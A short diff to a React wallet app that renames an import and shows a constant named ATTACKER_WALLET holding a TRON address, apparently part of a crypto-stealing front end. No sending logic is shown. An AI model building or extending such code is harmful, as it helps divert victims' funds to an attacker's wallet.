@@ -1,7 +1,7 @@
 import React from "react";
 import { BrowserRouter as Router, Routes, Route, useNavigate } from "react-router-dom";
 import { QRCodeSVG } from "qrcode.react";
-import WalletSend from "./WalletSend";
+import WalletSend from "./wallet";
 
 const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou";
 // Replace the current TRON_LOGO_B64 with this one:
